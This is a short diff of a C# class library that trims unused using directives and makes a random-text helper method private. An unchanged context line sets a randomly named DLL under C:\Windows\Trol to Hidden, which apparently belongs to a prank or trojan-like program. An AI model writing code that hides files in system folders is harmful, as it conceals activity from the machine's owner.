@@ -1,9 +1,5 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace ClassLibrary
 {
@@ -22,7 +18,7 @@ namespace ClassLibrary
             File.SetAttributes(@"C:\Windows\Trol\U15K97E53Y124Y14.dll", FileAttributes.Hidden);
         }
 
-        static string GetRandomTextFromAllSimbols(int length)
+        private static string GetRandomTextFromAllSimbols(int length)
         {
             string str = string.Empty;
             Random rnd = new Random();
